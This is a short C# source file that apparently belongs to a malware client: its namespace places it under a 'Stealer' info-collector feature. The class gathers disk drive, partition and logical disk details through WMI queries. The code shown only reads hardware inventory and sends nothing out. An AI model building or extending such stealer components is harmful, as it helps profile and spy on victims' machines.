using Gloom.WmiOps;

namespace Gloom.Client.Features.Stealer.InfoCollector.Wmi;
internal class WmiDiskInfo : WmiInfo
{
	public WmiDiskInfo() : base(WmiOpCodes.DiskInfo)
	{
	}

	public override object Collect()
	{
		return new DiskInfoResponse
		{
			DiskDrives = Crawl<Win32DiskDrive>("Win32_DiskDrive"),
			DiskPartitions = Crawl<Win32DiskPartition>("Win32_DiskPartition"),
			LogicalDisks = Crawl<Win32LogicalDisk>("Win32_LogicalDisk")
		};
	}
}
